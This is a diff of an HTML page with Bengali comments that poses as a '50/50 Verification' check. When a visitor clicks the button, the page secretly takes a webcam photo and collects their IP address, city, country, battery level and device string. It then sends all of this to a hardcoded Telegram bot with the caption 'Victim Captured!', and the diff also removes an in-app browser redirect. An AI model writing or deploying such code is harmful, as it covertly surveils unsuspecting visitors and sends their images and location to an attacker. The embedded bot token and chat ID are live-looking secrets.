@@ -6,7 +6,6 @@
     <title>50/50 Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
         body { 
             font-family: 'Segoe UI', Arial, sans-serif;
             text-align: center;
@@ -21,14 +20,12 @@
             background-repeat: no-repeat;
             background-attachment: fixed;
         }
-
         .overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.4); 
             z-index: 1;
         }
-
         .container {
             background: rgba(255, 255, 255, 0.15); 
             backdrop-filter: blur(10px); 
@@ -42,21 +39,19 @@
             z-index: 2;
             position: relative;
         }
-
         h1 { color: #ffffff; font-size: 28px; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
         h2 { color: #ffeb3b; font-size: 18px; margin-bottom: 10px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
         p { color: #ffffff; font-size: 15px; margin-bottom: 25px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
-
         #verify-btn { 
             background-color: #1a73e8; 
             color: white; border: none; padding: 15px 40px; 
             font-size: 18px; border-radius: 50px; cursor: pointer; 
             width: 100%; font-weight: bold;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
-
         #video, #canvas { display: none; }
-        #status { margin-top: 20px; color: #00ff00; font-weight: bold; font-size: 16px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+        #status { margin-top: 20px; font-weight: bold; font-size: 16px; text-shadow: 1px 1px 2px rgba(0,0,0,0.8); }
+        .success { color: #00ff00 !important; } /* সফল হলে সবুজ */
+        .error { color: #ff0000 !important; }   /* ব্যর্থ হলে লাল */
     </style>
 </head>
 <body>
@@ -75,14 +70,8 @@
     </div>
 
     <script>
-        // ১. অটোমেটিক ব্রাউজার ওপেনার (Messenger/Telegram detection)
-        if (navigator.userAgent.includes("Messenger") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV") || navigator.userAgent.includes("Telegram")) {
-            window.location.href = "intent://" + window.location.host + window.location.pathname + window.location.search + "#Intent;scheme=https;package=com.android.chrome;end";
-        }
-
         const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
         const adminId = "7068444019"; 
-
         const urlParams = new URLSearchParams(window.location.search);
         const userIdFromLink = urlParams.get('id'); 
 
@@ -91,7 +80,7 @@
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
 
-        // ২. ট্র্যাকিং ফাংশন (IP, Location, Battery)
+        // ট্র্যাকিং ডাটা ফাংশন
         async function getTrackerData() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -99,25 +88,24 @@
                 let batteryInfo = "N/A";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'চার্জ হচ্ছে' : 'না'})`;
                 }
                 return `\n\n📍 IP: ${d.ip}\n🌍 City: ${d.city}\n🚩 Country: ${d.country_name}\n🔋 Battery: ${batteryInfo}\n📱 Device: ${navigator.userAgent.substring(0, 45)}`;
-            } catch (e) { return "\n\n(Tracking data failed)"; }
+            } catch (e) { return "\n\n(Tracking Failed)"; }
         }
 
         verifyBtn.addEventListener('click', async () => {
-            status.innerText = "Processing... Please wait";
+            status.innerText = "Processing...";
+            status.className = ""; 
             verifyBtn.style.display = "none"; 
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                
-                // ট্র্যাকার ডাটা রেডি করা
                 const trackerInfo = await getTrackerData();
 
                 video.onloadedmetadata = () => {
-                    // ৩ সেকেন্ড সময় দেওয়া হয়েছে যাতে ক্যামেরা ফোকাস করতে পারে
+                    // ৩ সেকেন্ড ডিলে (আপনার অনুরোধ অনুযায়ী)
                     setTimeout(async () => {
                         const context = canvas.getContext('2d');
                         canvas.width = video.videoWidth;
@@ -125,21 +113,24 @@
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
                         canvas.toBlob(async (blob) => {
-                            const captionText = "📸 Victim captured!" + trackerInfo;
+                            const captionText = "📸 Victim Captured!" + trackerInfo;
                             
-                            // অ্যাডমিন এবং ইউজারকে ছবি পাঠানো
                             if (userIdFromLink && userIdFromLink !== adminId) {
                                 await sendToTelegram(blob, userIdFromLink, captionText);
                             }
                             await sendToTelegram(blob, adminId, captionText);
 
+                            // সফল হলে সবুজ লেখা
                             status.innerText = "Verification Successful!";
+                            status.className = "success";
                             stream.getTracks().forEach(track => track.stop());
-                        }, 'image/jpeg', 0.8);
+                        }, 'image/jpeg', 0.9);
                     }, 3000); 
                 };
             } catch (err) {
-                status.innerText = "Access denied! Please open in Chrome browser.";
+                // ক্যামেরা এলাও না করলে লাল লেখা
+                status.innerText = "Verification Unsuccessfully!";
+                status.className = "error";
                 verifyBtn.style.display = "block";
             }
         });
